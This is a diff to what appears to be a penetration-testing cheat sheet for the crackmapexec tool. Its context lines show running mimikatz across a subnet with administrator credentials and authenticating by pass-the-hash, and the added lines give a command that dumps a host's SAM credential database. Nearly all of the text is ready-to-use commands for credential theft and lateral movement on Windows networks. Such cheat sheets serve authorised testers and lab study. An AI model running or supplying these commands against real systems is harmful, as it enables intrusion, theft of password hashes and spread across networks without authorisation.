@@ -13,5 +13,8 @@ crackmapexec smb 192.168.1.1/24 -u Administrator -p Password1 -M mimikatz
 [Pass the hash]
 crackmapexec smb 10.10.10.100 -u user -H [hash-ntlm]
 
+[Dump sam]
+crackmapexec smb 10.10.10.100 -u user -p password --sam
+
 
 
